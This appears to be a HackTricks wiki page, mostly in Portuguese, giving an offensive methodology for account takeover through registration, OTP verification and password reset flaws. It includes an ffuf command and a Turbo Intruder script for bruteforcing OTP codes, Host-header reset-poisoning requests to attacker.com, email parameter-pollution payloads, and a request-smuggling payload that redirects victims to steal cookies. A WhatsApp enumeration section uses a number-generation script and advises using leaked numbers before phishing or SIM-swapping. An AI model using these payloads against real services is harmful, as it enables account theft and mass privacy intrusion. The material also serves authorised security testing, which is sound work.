# Vulnerabilidades de Registro e Takeover

{{#include ../banners/hacktricks-training.md}}

## Registro Takeover

### Registro Duplicado

- Tente gerar usando um username existente
- Verifique variações do email:
- uppsercase
- +1@
- adicionar algum ponto no email
- caracteres especiais no nome do email (%00, %09, %20)
- Colocar caracteres em branco após o email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Tente truques de canonicalization do provedor de email (dependente do serviço):
- Gmail ignora pontos e subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` entregam para `victim@gmail.com`
- Alguns provedores são case-insensitive na local-part
- Alguns provedores aceitam unicode confusables. Tente homoglyphs e soft hyphen `\u00AD` dentro da local-part
- Abuse isso para: burlar checagens de unicidade, obter contas duplicadas/invites de workspace, ou bloquear sign‑ups da vítima (DoS temporário) enquanto prepara um takeover

### Enumeração de usernames

Verifique se você consegue descobrir quando um username já foi registrado dentro da aplicação.

- Mensagens de erro ou códigos HTTP diferentes
- Diferenças de timing (usuário existente pode disparar lookup para IdP/DB)
- Autofill no formulário de registro de dados do perfil para emails conhecidos
- Verifique fluxos de equipe/invite: ao inserir um email pode revelar se uma conta existe

### Política de Senhas

Ao criar um usuário, verifique a política de senhas (veja se é possível usar senhas fracas).\
Nesse caso você pode tentar bruteforce nas credenciais.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)para aprender como tentar account takeovers ou extrair informações via **SQL Injections** em formulários de registro.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### Vulnerabilidades SAML


{{#ref}}
saml-attacks/
{{#endref}}

### Alterar Email

Quando registrado, tente alterar o email e verifique se essa alteração é corretamente validada ou se é possível trocar para emails arbitrários.

### Mais Verificações

- Verifique se é possível usar **disposable emails** (mailinator, yopmail, 1secmail, etc.) ou burlar a blocklist com subaddressing como `victim+mailinator@gmail.com`
- **Senha longa** (>200) leva a **DoS**
- **Verifique rate limits na criação de contas**
- Use username@**burp_collab**.net e analise o **callback**
- Se verificação por número de telefone for usada, verifique edge cases de parsing/injection de phone

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Mensageiros centrados em phone-number expõem um **presence oracle** sempre que o cliente sincroniza contatos. Replaying das discovery requests do WhatsApp historicamente entregaram **>100M lookups por hora**, permitindo enumerações de contas quase completas.

**Fluxo de ataque**

1. **Instrumente um cliente oficial** para capturar a request de upload da agenda (blob autenticado de números normalizados E.164). Reproduza-a com números gerados pelo atacante enquanto reutiliza os mesmos cookies/device token.
2. **Agrupe números por request**: o WhatsApp aceita milhares de identificadores e retorna registered/unregistered além de metadata (business, companion, etc.). Analise respostas offline para construir listas de alvos sem enviar mensagens às vítimas.
3. **Escalone horizontalmente** a enumeração com SIM banks, cloud devices, ou residential proxies para que throttling por conta/IP/ASN nunca dispare.

**Modelagem do plano de discagem**

Modele o plano de discagem de cada país para pular candidatos inválidos. O dataset NDSS (`country-table.*`) lista códigos de país, densidade de adoção e divisão por plataforma para que você possa priorizar ranges com alto retorno. Exemplo de código de seed:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritise prefixes that match real allocations (Mobile Country Code + National Destination Code) before querying the oracle to keep throughput useful.

**Transformando enumerações em ataques direcionados**

- Alimente leaked phone numbers (e.g., Facebook’s 2021 breach) no oracle para descobrir quais identidades ainda estão ativas antes de phishing, SIM-swapping, ou spamming.
- Fatia censos por country/OS/app type para encontrar regiões com filtragem de SMS fraca ou forte adoção do WhatsApp Business para engenharia social localizada.

## Correlação de reutilização de chaves públicas

WhatsApp exposes each account’s X25519 identity key during session setup. Request identity material for every enumerated number and deduplicate the public keys to reveal account farms, cloned clients, or insecure firmware—shared keys deanonymize multi-SIM operations.

## Verificação fraca de Email/Telefone (OTP/Magic Link)

Fluxos de registro frequentemente verificam propriedade via um OTP numérico ou um token de magic-link. Falhas típicas:

- OTP previsível ou curto (4–6 dígitos) sem rate limiting efetivo ou rastreamento por IP/dispositivo. Tente palpites paralelos e rotação de header/IP.
- Reutilização de OTP entre ações ou contas, ou não vinculado ao usuário/ação específicos (ex.: mesmo código funciona para login e signup, ou funciona após alteração de email).
- Multi-value smuggling: alguns backends aceitam múltiplos códigos e verificam se algum corresponde. Tente:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguir wrong vs expired vs wrong-user codes por status/mensagem/tamanho do body.
- Tokens não invalidados após sucesso ou após alteração de senha/email.
- Verification token não vinculado ao user agent/IP permitindo conclusão cross-origin a partir de páginas controladas pelo atacante.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Adivinhação paralela/concorrente para contornar bloqueios sequenciais (use Turbo Intruder no Burp):

<details>
<summary>Trecho do Turbo Intruder para inundar tentativas de OTP de 6 dígitos</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Tente racing verification: submeta o mesmo OTP válido simultaneamente em duas sessões; às vezes uma sessão torna‑se uma conta attacker verificada enquanto o fluxo do victim também tem sucesso.
- Também teste Host header poisoning em links de verificação (igual ao reset poisoning abaixo) para leak ou completar a verificação em um host controlled pelo attacker.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (antes do victim se inscrever)

Uma classe poderosa de problemas ocorre quando um attacker realiza ações no email do victim antes do victim criar a conta, e depois recupera o acesso.

Principais técnicas para testar (adapte aos fluxos do alvo):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Dicas práticas

- Harvest flows and endpoints from web/mobile bundles. Procure por classic signup, SSO linking, email/phone change, e password reset endpoints.
- Crie automação realista para manter sessões ativas enquanto executa outros fluxos.
- For SSO tests, stand up a test OIDC provider and issue tokens with `email` claims for the victim address and `email_verified=false` to check if the RP trusts unverified IdPs.
- Após qualquer password reset ou email change, verifique que:
  - todas as outras sessões e tokens são invalidados,
  - capacidades pendentes de email/phone change são canceladas,
  - IdPs/emails/phones previamente linkados são re‑verified.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. O atacante precisa fazer login com a própria conta e ir para a funcionalidade **Change password**.
2. Inicie o Burp Suite e intercepte a requisição
3. Envie para a aba repeater e edite os parâmetros : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

O token de redefinição de senha deve ser gerado aleatoriamente e ser único a cada vez.\
Tente determinar se o token expira ou se é sempre o mesmo; em alguns casos o algoritmo de geração é fraco e pode ser adivinhado. As seguintes variáveis podem ser usadas pelo algoritmo.

- Carimbo de data/hora (Timestamp)
- ID do Usuário
- Email do usuário
- Primeiro nome e sobrenome
- Data de nascimento
- Criptografia
- Apenas números
- Pequena sequência de token ( caracteres entre \[A-Z,a-z,0-9])
- Reutilização de token
- Data de expiração do token

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2. Inspecione a resposta do servidor e verifique por `resetToken`
3. Em seguida use o token em uma URL como `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registre-se no sistema com um username idêntico ao do alvo, mas com espaços em branco inseridos antes e/ou depois do username. e.g: `"admin "`
2. Solicite uma password reset com seu username malicioso.
3. Use o token enviado para seu email e redefina a senha da vítima.
4. Conecte-se à conta da vítima com a nova senha.

A plataforma CTFd foi vulnerável a esse ataque.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Encontre um XSS dentro da aplicação ou em um subdomínio se os cookies estiverem escopados ao domínio pai : `*.domain.com`
2. Leak the current **sessions cookie**
3. Autentique-se como o usuário usando o cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Use **smuggler** para detectar o tipo de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Crie uma requisição que sobrescreva o `POST / HTTP/1.1` com os seguintes dados:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` com o objetivo de open redirect as vítimas para burpcollab e roubar seus cookies\
3. A requisição final pode ser parecida com a seguinte
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone reports exploiting this bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Tomada de conta via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Crie um payload para o CSRF, ex.: “formulário HTML com envio automático para alteração de senha”
2. Envie o payload

### Tomada de conta via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token might be used to authenticate an user.

- Edite o JWT com outro User ID / Email
- Verifique assinatura JWT fraca


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert em Email Existente)

Alguns handlers de signup realizam um upsert quando o email fornecido já existe. Se o endpoint aceitar um corpo mínimo com email e senha e não exigir verificação de propriedade, enviar o email da vítima sobrescreverá a senha dela antes da autenticação.

- Discovery: colete nomes de endpoint a partir de JS empacotado (ou tráfego do app móvel), depois fuzz caminhos base como /parents/application/v4/admin/FUZZ usando ffuf/dirsearch.
- Method hints: um GET retornando mensagens como "Only POST request is allowed." frequentemente indica o verbo correto e que um body JSON é esperado.
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Exemplo PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impacto: Account Takeover (ATO) total sem qualquer reset token, OTP ou verificação por email.

## Referências

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
